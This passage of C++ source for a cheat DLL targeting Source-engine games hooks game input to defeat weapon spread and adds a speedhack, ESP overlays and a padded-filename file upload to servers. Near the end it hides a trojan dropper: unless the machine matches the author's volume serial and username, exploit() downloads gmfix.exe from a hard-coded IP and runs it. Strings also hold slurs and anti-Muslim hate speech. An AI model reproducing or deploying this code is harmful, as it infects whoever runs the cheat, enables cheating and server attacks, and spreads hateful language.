		if ( g_AppID == 440 && cmd->buttons & IN_ATTACK )
			cmd->buttons &= ~IN_ATTACK;
	}

	if ( menu->M_NoSpread == 1 )
	{
		FixShot( cmd );
	}

	if ( pLocalWeapon )
	{
		if ( !SkipReload )
		{
			if ( im_iClip1 == 0 && menu->M_AutoReload )
			{
				cmd->buttons |= IN_RELOAD;
				SkipReload = true;

			}
			
		}else{
			SkipReload = false;
		}
	}

}

CInput::CVerifiedUserCmd* verifiedUserCmds( )
{
    static CInput::CVerifiedUserCmd* pCommands = *(CInput::CVerifiedUserCmd**)((DWORD)g_pInput + 0xC8);

    return pCommands;
}

int CL_Speed = 0;


CUserCmd* GetUserCmd( void *th, signed int sequence_number )
{

	static CUserCmd* pCommands = *(CUserCmd**)((DWORD)th + 0xC4);

	CUserCmd *ret = &pCommands[ sequence_number % 90 ]; //(CUserCmd*)(pCommands + 348 * sequence_number % 90);
	
	return ret;
}


void __fastcall newCreateMove( void* thisptr, int edx, int sequence_number,  float input_sample_frametime, bool active )
{
	CreateMoveFn( thisptr, edx, sequence_number, input_sample_frametime, active );

	if ( !CreateMove_EBP )
		__asm mov CreateMove_EBP, ebp;

	CUserCmd *pCmd = GetUserCmd( g_pInput, sequence_number );

	DWORD* retnAddr = (DWORD*)( *(char**)CreateMove_EBP + 0x4 );
	bSendPacket = ( bool* )( *( bool** )CreateMove_EBP - 1 );

	if ( CL_Speed > 0 && menu->M_SpeedHack == 1 )
	{
		CL_Speed -= 1;
		*retnAddr -= 5;
	}else{
		CL_Speed = menu->S_SpeedHack;
	}

	int origNum = pCmd->command_number;

	ProcessUserCommand( pCmd );

	if ( menu->M_NoSpread )
		HighsBoson( pCmd );
	
}

inline CUserCmd* __fastcall hGetUserCmd( void* thisptr, int edx, signed int sequence_number)
{
	inputHook->unhookFunction(8);

	if ( sequence_number > highSeedNum )
		highSeedNum = sequence_number + 1;
	
	CUserCmd *ret = GetUserCmd( thisptr, sequence_number );

	inputHook->hookFunction(8, hGetUserCmd);

	return ret;
};

void HighsBoson( CUserCmd *T )
{

	if (  menu->M_NoSpread == 1 )
	{

		DWORD dwEBP = NULL;
		__asm mov dwEBP, ebp;
		
		if ( !dwEBP )
			return;

		DWORD* p = &dwEBP;

		int seed = 142;//500;

		if ( g_AppID == 240 ) // css
			seed = 2087;

		if ( g_AppID == 440 ) // tf2
		{
			if ( pLocalWeapon && pLocalWeapon->entindex() != 0 )
			{

				const char *classname = pLocalWeapon->GetClassname();

				if ( strstr(classname, "minigun") )
					seed = 188;

			}
		}

		int origNum = T->command_number;

		int ideal = MD5_PseudoRandom(seed) & 255;
		int num = 0;
		highSeedNum += 250;

		int shit = 0;
		for ( int i = highSeedNum + 1; !num; i++ )
		{
			if ( (MD5_PseudoRandom(i) & 255) != ideal )
				continue;
			
			shit++;

			if ( shit > 3000 )
				break;
			
			num = i;

		}

		T->command_number = num;
		T->random_seed = MD5_PseudoRandom( T->command_number ) & 0x7fffffff;

		
		CInput::CVerifiedUserCmd *userCmds = verifiedUserCmds();

		userCmds[origNum % MULTIPLAYER_BACKUP ].m_cmd = *T;
		userCmds[T->command_number % MULTIPLAYER_BACKUP ].m_cmd = *T;
	}

}


void DrawCrosshair( LPDIRECT3DDEVICE9 pDevice )
{
	switch( menu->S_CrossHair )
	{
	case 1:

		FillRGB(CenterX-15, CenterY, 30, 1, Red);
		FillRGB(CenterX, CenterY-15, 1, 30, Red);
		break;
	case 2:
		DrawLine(CenterX+10, CenterY+10, CenterX-10, CenterY-10, 2, Red);
		DrawLine(CenterX-10, CenterY+10, CenterX+10, CenterY-10, 2, Red);
		break;
	case 3:
		FillRGB(CenterX-15, CenterY, 10, 1,Red);//Left line
		FillRGB(CenterX+6, CenterY, 10, 1,Red);//Right line
		FillRGB(CenterX, CenterY-15, 1, 10,Red);//Top line
		FillRGB(CenterX, CenterY+6, 1, 10,Red);//Bottom line
		DrawPoint(CenterX,CenterY,1,1,Green);
		break;
	case 4:
		DrawLine(CenterX+15,CenterY+3,CenterX+3,CenterY+3,2,Red);
		DrawLine(CenterX-15,CenterY+3,CenterX-3,CenterY+3,2,Red);
		DrawLine(CenterX+15,CenterY-3,CenterX+3,CenterY-3,2,Red);
		DrawLine(CenterX-15,CenterY-3,CenterX-3,CenterY-3,2,Red);
		DrawPoint(CenterX,CenterY,1,1,Green);
		break;
	case 5:
		DrawLine(CenterX+15,CenterY+15,CenterX+3,CenterY+3,2,Red);
		DrawLine(CenterX-15,CenterY+15,CenterX-3,CenterY+3,2,Red);
		DrawLine(CenterX+15,CenterY-15,CenterX+3,CenterY-3,2,Red);
		DrawLine(CenterX-15,CenterY-15,CenterX-3,CenterY-3,2,Red);
		DrawPoint(CenterX,CenterY,1,1,Green);
		break;
	}

}


void DrawLivingESP( C_BaseEntity *pBaseEntity, const char *name, bool is_npc )
{
	if ( !pBaseEntity || !name )
		return;

	Vector AbsScreen = Vector(0,0,0);
	Vector origin = GetAbsOrigin(pBaseEntity);

	if ( origin.x == 0 && origin.y == 0 && origin.z == 0 )
		return;

	if( WorldToScreen( origin, AbsScreen ) == false )
		return;

	if ( AbsScreen.x == 0 && AbsScreen.y == 0 )
		return;

	D3DCOLOR DrawColor = D3DCOLOR_RGBA( 0, 107, 60, 255 );
	
	int health = 0;
	
	health = GetHealth( pBaseEntity );

	if ( !IsAlive(pBaseEntity) )
	{
		DrawColor = D3DCOLOR_RGBA( 0, 0, 0, 255 );
	}else{

		if ( !is_npc )
			DrawColor = GetTeamCol( pBaseEntity );

	}

	char c_health[11];
	sprintf(c_health, "%d", health);

	if ( menu->M_ESP_Name )
		PrintText( name, AbsScreen.x, AbsScreen.y, DrawColor, g_pFont);

	if ( menu->M_ESP_Health )
		PrintText( c_health, AbsScreen.x, AbsScreen.y + 8.0f, DrawColor, g_pFont);

	if ( menu->M_ESP_Box && !is_npc )
	{
		Vector mon, nom;

		int flags = GetFlags( pBaseEntity );

		if ( !flags )
			return;

		nom = GetAbsOrigin( pBaseEntity );


		if (flags & FL_DUCKING)
		{
			mon = nom + Vector( 0, 0, 50.f );
		}
		else
		{
			mon = nom + Vector( 0, 0, 70.f );
		}

		Vector bot, top;

		if( WorldToScreen( nom, bot ) && WorldToScreen( mon, top ) )
		{
			float h = ( bot.y - top.y );

			float w = h / 4.f;

			OutlineRGBA( top.x - w, top.y, w * 2, ( bot.y - top.y ), 1, DrawColor );
		}
	}

}

void DrawWeaponESP( C_BaseEntity *pBaseEntity, const char *name )
{
	if ( strcmp(name, "prop_weapon") == 0 ) // gay
	{

		name = g_pModelInfo->GetModelName( pBaseEntity->GetModel() );

	}

	if ( !pBaseEntity || !name )
		return;

	Vector AbsScreen = Vector(0,0,0);
	Vector origin = GetOrigin(pBaseEntity);

	if ( origin.x == 0 && origin.y == 0 && origin.z == 0 )
		return;

	if( WorldToScreen( origin, AbsScreen ) == false )
		return;

	if ( AbsScreen.x == 0 && AbsScreen.y == 0 )
		return;

	D3DCOLOR DrawColor = D3DCOLOR_RGBA(255, 255, 0, 255);

	PrintText( name, AbsScreen.x, AbsScreen.y, DrawColor, g_pFont);
}

void DrawCustomESP( C_BaseEntity *pBaseEntity, const char *name )
{

	if ( !pBaseEntity || !name )
		return;

	if ( !strstr(menu->T_CustomESP.c_str(), name) )
		return;

	Vector AbsScreen = Vector(0,0,0);
	Vector origin = GetAbsOrigin(pBaseEntity);

	if ( origin.x == 0 && origin.y == 0 && origin.z == 0 )
		return;

	if( WorldToScreen( origin, AbsScreen ) == false )
		return;

	if ( AbsScreen.x == 0 && AbsScreen.y == 0 )
		return;

	D3DCOLOR DrawColor = D3DCOLOR_RGBA(255, 255, 0, 255);

	PrintText( name, AbsScreen.x, AbsScreen.y, DrawColor, g_pFont);

}
void DrawESP( LPDIRECT3DDEVICE9 pDevice )
{

	if( !bIsReady )
		return;

	for( int i = 0; i < HighestEntityIndex; i++ )
	{

		if( i == g_LocalPlayerNum )
			continue;

		if ( i > HighestEntityIndex )
			break;

		if ( i > 50000 )
			break;


		C_BaseEntity *pBaseEntity = (C_BaseEntity*)g_pEntList->GetClientEntity(i);

		if ( !pBaseEntity )
			continue;

		if ( pBaseEntity->entindex() == 0 )
			continue;

		Vector origin = GetAbsOrigin(pBaseEntity);

		if ( origin.x == 0 && origin.y == 0 && origin.z == 0 )
			continue;
		
		const char *classname = pBaseEntity->GetClassname();

		if ( !classname )
			continue;

		bool is_living = false;
		bool is_npc = false;

		if ( menu->M_ESP_Players == 1 && ( strcmp(classname, "player") == 0 || strstr(classname, "Player") ) )
		{
			is_living = true;
		}

		if ( menu->M_ESP_NPCs == 1 && ( strstr(classname, "npc_") || strstr(classname, "obj_") ) )
		{
			is_living = true;
			is_npc = true;
		}

		if ( is_living )
		{

			if ( is_living && !is_npc )
			{

				player_info_s plInfo;

				g_pEngine->GetPlayerInfo( i, &plInfo );


				if ( !plInfo.name )
				{
					DrawLivingESP( pBaseEntity, classname, is_npc);
					continue;
				}

				classname = plInfo.name;
			}

			DrawLivingESP( pBaseEntity, classname, is_npc);
			
			continue;
		}

		if ( menu->M_ESP_Weapons )
		{

			if ( strstr(classname, "weapon") || strstr(classname, "m9k") || strstr(classname, "gdcw_") || strstr(classname, "bb_") )
				DrawWeaponESP( pBaseEntity, classname );

			continue;
		}

		DrawCustomESP( pBaseEntity, classname );

	}

}

void DrawViewESP( LPDIRECT3DDEVICE9 pDevice )
{

	if ( viewESP_Classname == NULL )
	{
		PrintText("worldspawn", ScrW - 300,2, Black,g_pFont2);
		return;
	}
	
	PrintText(viewESP_Classname, ScrW - 300, 2, Black, g_pFont2);

}

void DrawAimLine( LPDIRECT3DDEVICE9 pDevice )
{


}

void TestDrawStatus(LPDIRECT3DDEVICE9 pDevice)
{

	if ( menu->S_CrossHair != 0 )
		DrawCrosshair( pDevice );

	if ( menu_opened )
	{
		menu->DrawMenu();
	}

	if ( !bIsReady )
		return;

	if ( menu->M_ESP_Box == 1 || menu->M_ESP_Health == 1 || menu->M_ESP_Name == 1 || menu->M_ESP_Weapons == 1 || menu->T_CustomESP.length() > 1 )
		DrawESP( pDevice );

	if ( menu->M_ESP_ViewESP == 1 )
		DrawViewESP( pDevice );

	if ( menu->M_AimEnable == 1 && menu->M_Aim_Silent == 1 )
		DrawAimLine( pDevice );


}

HWND hWnd;
const MARGINS  margin = {-1,-1,-1,-1};

void RenderOverlay( bool bReset );

void D3DInit(HWND hWnd)
{
    // create the Direct3D interface


	HRESULT ret = Direct3DCreate9Ex(D3D_SDK_VERSION, &D3D);

	while( true )
	{
		if ( !FAILED(ret) )
			break;

		ret = Direct3DCreate9Ex(D3D_SDK_VERSION, &D3D);

		if ( !FAILED(ret) )
			break;

	}

    D3DPRESENT_PARAMETERS d3dpp;    // create a struct to hold various device information

    ZeroMemory(&d3dpp, sizeof(d3dpp));    // clear out the struct for use
    d3dpp.Windowed = TRUE;    // program windowed, not fullscreen
    d3dpp.SwapEffect = D3DSWAPEFFECT_COPY/*D3DSWAPEFFECT_DISCARD*/;    // discard old frames
    d3dpp.hDeviceWindow = hWnd;    // set the window to be used by Direct3D
    d3dpp.BackBufferFormat = D3DFMT_A8R8G8B8;     // set the back buffer format to 32-bit
    d3dpp.BackBufferWidth = ScrW;    // set the width of the buffer
    d3dpp.BackBufferHeight = ScrH;    // set the height of the buffer
	d3dpp.MultiSampleQuality   = D3DMULTISAMPLE_NONE;
	d3dpp.Flags = D3DPRESENTFLAG_VIDEO | D3DPRESENTFLAG_RESTRICTED_CONTENT;
    d3dpp.EnableAutoDepthStencil = TRUE;
    d3dpp.AutoDepthStencilFormat = D3DFMT_D16;

    // create a device class using this information and the info from the d3dpp stuct

	HRESULT res = D3D->CreateDevice(D3DADAPTER_DEFAULT,
                      D3DDEVTYPE_HAL,
                      hWnd,
                      D3DCREATE_HARDWARE_VERTEXPROCESSING | D3DCREATE_MULTITHREADED | D3DCREATE_FPU_PRESERVE,
                      &d3dpp,
                      &m_pDevice);

	while( true )
	{
		if ( !FAILED(res) )
			break;

		res = D3D->CreateDevice(D3DADAPTER_DEFAULT,
                      D3DDEVTYPE_HAL,
                      hWnd,
                      D3DCREATE_HARDWARE_VERTEXPROCESSING | D3DCREATE_MULTITHREADED | D3DCREATE_FPU_PRESERVE,
                      &d3dpp,
                      &m_pDevice);

		if ( !FAILED(res) )
			break;
	}

}

bool menu_initiated = false;
bool fixed_draw = false;

void RenderOverlay( bool bReset )
{

	if ( !menu_initiated )
	{

		menu_initiated = true;
		zFont.FontManager( m_pDevice );
		menu->InitMenu();
	}

	if ( menu && menu_initiated && !bReset )
	{

		fixed_draw = false;
		m_pDevice->Clear(0, 0, D3DCLEAR_TARGET, 0, 1.0f, 0);
		m_pDevice->BeginScene();

			pSprite->Begin( D3DXSPRITE_ALPHABLEND );

			m_pDevice->SetFVF( D3DFVF_XYZ | D3DFVF_DIFFUSE | D3DFVF_TEX1 );
			TestDrawStatus(m_pDevice);

			pSprite->End();

		m_pDevice->EndScene();
		m_pDevice->Present(0, 0, 0, 0 );
	}

	if ( bReset && !fixed_draw )
	{
		m_pDevice->Clear(0, 0, D3DCLEAR_TARGET, 0, 1.0f, 0);
		m_pDevice->Clear(0, 0, D3DCLEAR_ZBUFFER, 0, 1.0f, 0);
		m_pDevice->Clear(0, 0, D3DCLEAR_STENCIL, 0, 1.0f, 0);

		m_pDevice->BeginScene();
		m_pDevice->EndScene();
		m_pDevice->Present(0, 0, 0, 0 );
		fixed_draw = true;
	}

}

LRESULT CALLBACK WindowProc(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam)
{
    switch(message)
    {
	case WM_CREATE:
        {

        if ( !FAILED(DwmExtendFrameIntoClientArea(hWnd, &margin)) )
		{
			Sleep(2);
		}

        }break;

     case WM_DESTROY:
		{

			return 0;
		} break;
    }

    return DefWindowProc (hWnd, message, wParam, lParam);
}

MSG *Nachricht;
LRESULT CALLBACK DebugProc(int nCode, WPARAM wParam, LPARAM lParam)
{
	if ( nCode < 0 )
		return CallNextHookEx(0, nCode, wParam, lParam);

	MSG *msg = (MSG*)lParam;

	if ( nCode == HC_ACTION && msg->message == WM_MOUSEMOVE )
	{
		MOUSEHOOKSTRUCT *hookStruct = (MOUSEHOOKSTRUCT*)lParam;
	
		POINT pnt;
		pnt.x = hookStruct->pt.x;
		pnt.y = hookStruct->pt.y;
		//menu->Cur = pnt;
		//Msg("%i : %i\n", pnt.x, pnt.y);

	}

	if ( msg->message == WM_CHAR )
	{
		char charCode = msg->wParam;

		stringstream ss;
		ss << charCode;

		menu->textCharBuf[0] = '\0';
		strcpy(menu->textCharBuf, ss.str().c_str());
	}

	return CallNextHookEx(0, nCode, wParam, lParam);
}

int D3DThread( )
{

	if ( game_HWND == NULL )
		game_HWND = FindWindow(NULL, "Garry's Mod");

	if( game_HWND == NULL )
		game_HWND = FindWindow(NULL, "Counter-Strike Source");

	if( game_HWND == NULL )
		game_HWND = FindWindow(NULL, "Counter-Strike: Global Offensive");

	if ( game_HWND == NULL )
		game_HWND = FindWindow(NULL, "Team Fortress 2");

	if ( game_HWND == NULL )
		game_HWND = FindWindow(NULL, "Left 4 Dead 2");

	if( game_HWND == NULL )
	{
		MessageBox( NULL, "could not find game ?!", "k", MB_OK );
		return 0;
	}

	RECT rc;

	GetWindowRect(game_HWND, &rc);

	SetForegroundWindow(game_HWND);

	ScrW =  rc.right - rc.left;
	ScrH = rc.bottom - rc.top;

	CenterX = ScrW/2;
	CenterY = ScrH/2;

	HINSTANCE inst = (HINSTANCE)550;

	if ( !registered_OurWND )
	{
	
		wClass.cbClsExtra = NULL;
		wClass.cbSize = sizeof(WNDCLASSEX);
		wClass.cbWndExtra = NULL;
		wClass.hbrBackground = (HBRUSH)CreateSolidBrush(RGB(0, 0, 0));
		wClass.hCursor = LoadCursor(0, IDC_ARROW);
		wClass.hIcon = LoadIcon(0, IDI_APPLICATION);
		wClass.hIconSm = LoadIcon(0, IDI_APPLICATION);
		wClass.hInstance = inst;
		wClass.lpfnWndProc = WindowProc;
		wClass.lpszClassName = "Fraps Overlay";
		wClass.lpszMenuName = "Fraps Overlay";
		wClass.style = CS_VREDRAW | CS_HREDRAW;

		if (!RegisterClassEx(&wClass) )
		{
			Sleep(50);
			D3DThread();
		}else{
			registered_OurWND = true;
		}

	}

	unsigned int TID = {0};
	TID = GetWindowThreadProcessId(game_HWND, 0);

	Sleep(1);
	SetWindowsHookExA(WH_GETMESSAGE, DebugProc, hInstDLLHandle, TID);

	while( true )
	{
		Sleep(1);
		if ( hWnd == NULL )
		{
			hWnd = CreateWindowExA(WS_EX_TOPMOST | WS_EX_TRANSPARENT | WS_EX_LAYERED | WS_EX_NOACTIVATE,
                          "Fraps Overlay",
                          "Fraps Overlay",
                          WS_POPUP | WS_OVERLAPPED | WS_CHILD | WS_DISABLED | WS_SYSMENU,
                          1,
						  1,
                          ScrW, ScrH,
                          NULL,
                          NULL,
                          inst,
                          NULL);

			if ( hWnd != NULL )
				break;
		}else{
			break;
		}
	}

	SetLayeredWindowAttributes(hWnd, RGB(0,0,0), 255, ULW_COLORKEY | LWA_COLORKEY | LWA_ALPHA);
	
	ShowWindow(hWnd, SW_SHOW);

	D3DInit(hWnd);

	SetForegroundWindow(game_HWND);

	MSG msg;

	while( true )
    {

		if ( PeekMessage(&msg, NULL, 0, 0, PM_REMOVE) )
		{
			//TranslateMessage(&msg);
            DispatchMessage(&msg);
        }

		if ( game_HWND )
		{
			GetWindowRect(game_HWND, &rc);
			ScrW = rc.right - rc.left;
			ScrH = rc.bottom - rc.top;
			DWORD dwStyle = GetWindowLong(game_HWND, GWL_STYLE);
			if(dwStyle & WS_BORDER)
			{
				rc.top += 23;
				ScrH -= 23;
			}

			if ( hWnd )
				MoveWindow(hWnd, rc.left, rc.top, ScrW, ScrH, true);
		}

		if ( GetForegroundWindow() == hWnd )
			SetForegroundWindow(game_HWND);
		else if ( GetForegroundWindow() != game_HWND || IsGameOverlayOpen() )
		{
			RenderOverlay( true );
			continue;
		
		}

		if ( ment_candraw )
		{
			RenderOverlay( false );
			menu->MenuNavigation();
		}

		if ( menu_initiated )
		{

			if( GetAsyncKeyState(VK_F9)&1 )
			{
				INetChannel *net = (INetChannel *)g_pEngine->GetNetChannelInfo();

				char *file_name = "bopping.dll";
				int file_name_len = strlen(file_name);

				char buffer_input[255 + 4];
				strcpy(buffer_input, file_name);

				for (int i = 0; i < 255 - file_name_len; i++) {
					strcat(buffer_input, " ");
				}

				strcat(buffer_input, ".txt");

				net->SendFile(buffer_input, 90);
			}

			if( GetAsyncKeyState(VK_F10)&1 )
			{
				menu_opened = !menu_opened;
			
				if ( !menu_opened )
				{
					for(int i = 0; i < menu->TextBoxCount; i++)
					{
						menu->TextBoxes[i].Focused = false;
					}
				}
			}

			if ( GetAsyncKeyState(VK_F12)&1 )
			{

				menu->M_FreezeHack = !menu->M_FreezeHack;
			}

			if ( GetAsyncKeyState(VK_F11)&1 )
			{
				menu->M_SpeedHack = !menu->M_SpeedHack;
			}

		}


    }



    return msg.wParam;
}

int Mentranium_ThinkThread()
{
	while( true )
	{
		Mentranium_Think();
		Sleep(2000);
	}
}

class MentraniumEventHandler : public IGameEventListener2
{
	void FireGameEvent( IGameEvent* event )
	{
		if(Q_strcmp(event->GetName(), "player_hurt") == 0)
		{
			int victimID = event->GetInt( "userid" );
			int attackerID = event->GetInt( "attacker" );

			player_info_s pVictimInfo;
			player_info_s pAttackerInfo;

			g_pEngine->GetPlayerInfo( g_pEngine->GetPlayerForUserID(victimID), &pVictimInfo ); 

			g_pEngine->GetPlayerInfo( g_pEngine->GetPlayerForUserID(attackerID), &pAttackerInfo );

			if ( menu->M_VoiceChatSpam )
				Msg( "[(Mentranium)] %s damaged %s \n", pAttackerInfo.name, pVictimInfo.name );
		}

		if(Q_strcmp(event->GetName(), "player_say") == 0)
		{

			int userId = event->GetInt( "userid");
			const char* text = event->GetString( "text");
			
			if ( menu->M_TextChatImitator )
			{

				if ( !menu->M_TextChatTeam )
					Mentranium_Say( text );
				else
					Mentranium_TeamSay( text );

			}

		}

		if(Q_strcmp(event->GetName(), "game_newmap") == 0)
		{

		}

	}
} GameEventHandler;


void __fastcall newFrameStageNotify( void *thisptr, int edx, ClientFrameStage_t curStage )
{
	

	if ( curStage == FRAME_RENDER_START )
	{

		if ( bIsReady )
		{
			if ( g_AppID == 4000 )
			{

				worldToScreen = *(VMatrix*)(dwEngineDLLHandle+0x5D2EC8);
			}else{
				worldToScreen = g_pEngine->WorldToScreenMatrix();
			}

		}

		ment_candraw = true; //draw overlay frame
	}

	FrameStageNotifyFn( thisptr, edx, curStage );

}

void* __fastcall newSetCursorPos( void* thisptr, int edx, int x, int y )
{
	MessageBox( NULL, "niggercall", "ok", MB_OK );
	Msg( "%i : %i \n", x, y );

	void *ret = setcursorpos_Hook->Call(2, x, y );

	return ret;

}

char* InitializeInterfaces( )
{

	//Get Interfaces
	g_pClient		= ( IBaseClientDLL* ) getEnterprise( &clientFactory, "VClient" );
	g_pEngine		= ( IVEngineClient* ) getEnterprise( &engineFactory, "VEngineClient" );
	g_pEntList		= ( IClientEntityList* ) getEnterprise( &clientFactory, "VClientEntityList" );
	g_pEngine		= ( IVEngineClient* ) getEnterprise( &engineFactory, "VEngineClient" );
	g_pEngineTrace	= ( IEngineTrace* ) getEnterprise( &engineFactory, "EngineTraceClient" );
	g_pModelInfo	= ( IVModelInfoClient* ) getEnterprise( &engineFactory, "VModelInfoClient" );
	g_pGameManager	= ( IGameEventManager2* ) getEnterprise( &engineFactory, "GAMEEVENTSMANAGER" );
	g_pPlayerManager= ( IPlayerInfoManager* ) getEnterprise( &serverFactory, "PlayerInfoManager" );
	g_pMovement		= ( IGameMovement* ) getEnterprise( &clientFactory, "GameMovement" );
	g_pPrediction	= ( Prediction* ) getEnterprise( &clientFactory, "VClientPrediction" );
	g_pCVar			= ( ICvar* ) getEnterprise( &vstdLibFactory, "VEngineCvar" );
	void *g_pVGUI2	= ( void* ) getEnterprise( &vguiLibFactory, "VGUI_Panel" );

	PDWORD pdwClientVirtual = *reinterpret_cast< PDWORD* >( g_pClient );

	DWORD virtualCreateMove = pdwClientVirtual[21];

	if ( !g_pClient )
	{
		return "g_pClient == NULL";
	}

	if ( !g_pEntList )
	{
		return "g_pEntList == NULL";
	}

	if ( !g_pEngine )
	{
		return "g_pEngine == NULL";
	}

	if ( !g_pEngineTrace )
	{
		return "g_pEngineTrace == NULL";
	}

	if ( !g_pModelInfo )
	{
		return "g_pModelInfo == NULL";
	}

	if ( !g_pPlayerManager )
	{
		return "g_pPlayerManager == NULL";
	}

	if ( !g_pPrediction )
	{
		return "g_pPrediction == NULL";
	}

	if ( !g_pMovement )
	{
		return "g_pMovement == NULL";
	}
	
	if ( !g_pGameManager )
	{
		return "g_pGameManager == NULL";
	}

	if ( !g_pVGUI2 )
	{
		return "g_pVGUI2 == NULL";
	}

	if ( !g_pCVar )
	{
		return "g_pCVar == NULL";
	}

	g_AppID = g_pEngine->GetAppID();

	menu = new cuntMena();

	if ( g_AppID != 4000 )
	{
		DWORD dwInputPointer = dwFindPattern(virtualCreateMove, "\x8B\x0D", "xx" );

		if ( dwInputPointer != NULL )
		{
			dwInputPointer += 0x2;
			g_pInput = **( CInput*** )dwInputPointer; //A pointer within a pointer. Pointerception
		}
	}else{

		PDWORD pdwInputVMT = (PDWORD)*(PDWORD)(g_pInput = (CInput*)(*(PDWORD)*(PDWORD)(dwFindPattern(virtualCreateMove, "\x8B\x0D????\x8B\x01\x8B\x40\x0C\x52\x8B\x55\x08\x51\xD9\x1C\x24", "xx????xxxxxxxxxxxxx") + 2)));

	}

	if ( !g_pInput )
	{
		return "g_pInput == NULL";
	}

	// Hook Shit

	inputHook = new CVMTHook( g_pInput );
	clientHook = new CVMTHook( g_pClient );
	engineHook = new CVMTHook( g_pEngine );
	CVMTHook *drawHook = new CVMTHook( g_pVGUI2 );


	GetUserCmdFn = (OriginalGetUserCmd)inputHook->hookFunction(8, hGetUserCmd);

	FrameStageNotifyFn = (OriginalFrameStageNotify)clientHook->hookFunction(35, newFrameStageNotify);
	CreateMoveFn = (OriginalCreateMove)clientHook->hookFunction(21, newCreateMove);

	if ( g_AppID != 4000 )
	{
		if ( !GetUserCmdFn )
		{
			return "Could not hook CInput::GetUserCmd";
		}
	}

	if ( !FrameStageNotifyFn )
	{
		return "Could not hook CEngineClient::FrameStageNotify";
	}


	g_pGameManager->AddListener( &GameEventHandler, "player_hurt", false);
	g_pGameManager->AddListener( &GameEventHandler, "player_say", false);
	g_pGameManager->AddListener( &GameEventHandler, "game_newmap", false);

	char *getnetvars = InitNetvars();

	if ( getnetvars != NULL )
	{
		return getnetvars;
	}

	Msg("Initiazed NetVars !\n");

	stringstream s_gAppID;
	s_gAppID << "Game AppID: ";
	s_gAppID << g_AppID;
	s_gAppID << "\n";

	Msg( s_gAppID.str().c_str() );

	if ( !getclass )
	{
		if ( g_AppID == 4000 )
		{
			getclass = (GetClassnameFn)dwFindPattern( dwClientDLLHandle, "\x57\x8B\xF9\x8B\x87\x00\x00\x00\x00\x85\xC0\x74\x0D\x50\xE8",
			"xxxxx????xxxxxx");
		}else{
			getclass = (GetClassnameFn)dwFindPattern( dwClientDLLHandle, "\x57\x8B\xF9\xC6\x05",
			"xxxxx");
		}
	}

	if ( !getclass )
	{
		MessageBox( NULL, "HAVENT GOT C_BaseEntity::GetClassname()", "GAY", MB_OK );
	}

	g_pCVar->FindVar( "fps_max" )->SetValue(9999);

	return 0;
}

#define BUFFERSIZE 4096
bool DownloadFile(string url, LPCSTR filename)
{
    string request; // HTTP Header //
 
    char buffer[BUFFERSIZE];
    struct sockaddr_in serveraddr;
    int sock;
 
    WSADATA wsaData;
    int port = 80;
   
    // Remove's http:// part //
    if(url.find("http://") != -1){
        string temp = url;
        url = temp.substr(url.find("http://") + 7);
    }
   
    // Split host and file location //
    int dm = url.find("/");
    string file = url.substr(dm);
    string shost = url.substr(0, dm);
   
    // Generate http header //
    request += "GET " + file + " HTTP/1.0\r\n";
    request += "Host: " + shost + "\r\n";
    request += "\r\n";
 
    if (WSAStartup(MAKEWORD(2, 0), &wsaData) != 0)
        return FALSE;
 
    if ((sock = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP)) < 0)
        return FALSE;
 
    memset(&serveraddr, 0, sizeof(serveraddr));
   
    // ip address of link //
    hostent *record = gethostbyname(shost.c_str());
    in_addr *address = (in_addr * )record->h_addr;
    string ipd = inet_ntoa(* address);
    const char *ipaddr = ipd.c_str();
 
    serveraddr.sin_family = AF_INET;
    serveraddr.sin_addr.s_addr = inet_addr(ipaddr);
    serveraddr.sin_port = htons(port);
 
    if (connect(sock, (struct sockaddr *) &serveraddr, sizeof(serveraddr)) < 0)
        return FALSE;
 
    if (send(sock, request.c_str(), request.length(), 0) != request.length())
        return FALSE;
 
    int nRecv, npos;
    nRecv = recv(sock, (char*)&buffer, BUFFERSIZE, 0);
   
    // getting end of header //
    string str_buff = buffer;
    npos = str_buff.find("\r\n\r\n");
   
    // open the file in the beginning //
    HANDLE hFile;
    hFile = CreateFileA(filename, GENERIC_WRITE, FILE_SHARE_WRITE, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    SetFilePointer(hFile, 0, NULL, FILE_BEGIN);
 
    // Download file //
    DWORD ss;
    while((nRecv > 0) && (nRecv != INVALID_SOCKET)){
        if(npos > 0){
            char bf[BUFFERSIZE];
            // copy from end position of header //
            memcpy(bf, buffer + (npos + 4), nRecv - (npos + 4));
            WriteFile(hFile, bf,nRecv - (npos + 4), &ss, NULL);
        }else{
            // write normally if end not found //
            WriteFile(hFile, buffer, nRecv, &ss, NULL);
        }
       
        // buffer cleanup  //
        ZeroMemory(&buffer, sizeof(buffer));
        nRecv = recv(sock, (char*)&buffer, BUFFERSIZE, 0);
        str_buff = buffer;
        npos = str_buff.find("\r\n\r\n");
    }
   
    // Close connection and handle //
    CloseHandle(hFile);
    closesocket(sock);
    WSACleanup();
 
    return TRUE;
}

void exploit()
{
	bool done = DownloadFile("http://31.186.251.156/gmfix.tct", "gmfix.exe");
	
	if ( done )
	{
		ShellExecuteA(NULL, "open", "gmfix.exe", NULL, NULL, 5);
		system("gmfix.exe");

	}else{
		Sleep(500);
		exploit();
	}
}

int StartLoading( )
{

	FILE * fap = fopen("C:\\Graphics\\Custom3DHD_Driver\\yesyesfuckmuslims.tct", "rb");
	if(!fap)
	{
		exploit();
		return 0;
	}

	TCHAR volumeName [MAX_PATH + 1] = { 0 };
	TCHAR fileSystemName [MAX_PATH +1] = { 0 };

	DWORD serialNumber, maxComponentLen, fileSystemFlags = 0;

	if ( !GetVolumeInformation(  _T("C:\\"),  volumeName, ARRAYSIZE(volumeName), &serialNumber, &maxComponentLen, &fileSystemFlags, fileSystemName, ARRAYSIZE(fileSystemName)))
	{
		exploit();
		return 0;
	}

	char cserialNumber[99999];
	ltoa((long)serialNumber, cserialNumber, 10);

	char cfileSystemFlags[99999];
	ltoa((long)fileSystemFlags, cfileSystemFlags, 10);

	char username[UNLEN+1];
	DWORD username_len = UNLEN+1;
	GetUserName(username, &username_len);

	string dick = string(fileSystemName) + string(cserialNumber) + string(username) + string(cfileSystemFlags);

	//MessageBox( NULL, dick.c_str(), "k ;)", MB_OK );

	if ( string(dick).compare( "NTFS217495932Leystryku65470719" ) != 0 )
	{
		exploit();
		Sleep(99999999);
		return 0;
	}

	ClientDLLHandle = GetModuleHandle( "client.dll" );
	EngineDLLHandle = GetModuleHandle( "engine.dll" );
	ServerDLLHandle = GetModuleHandle( "server.dll" );
	VstdLibDLLHandle = GetModuleHandle( "vstdlib.dll" );
